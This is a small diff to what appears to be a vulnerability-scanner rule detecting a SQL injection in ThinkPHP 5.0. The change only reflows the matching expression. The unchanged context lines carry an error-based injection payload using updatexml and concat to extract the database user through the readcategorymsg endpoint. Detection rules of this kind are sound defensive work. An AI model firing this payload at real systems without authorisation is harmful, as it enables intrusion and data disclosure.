@@ -5,8 +5,7 @@ rules:
   - method: GET
     path: /Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml({{r1}},concat(0x7e,(user()),0))
     follow_redirects: false
-    expression:
-      response.status == 404 && response.body.bcontains(bytes(string(r1)))
+    expression: response.status == 404 && response.body.bcontains(bytes(string(r1)))
 detail:
   author: elliot
   Affected Version: "ThinkPHP5.0"
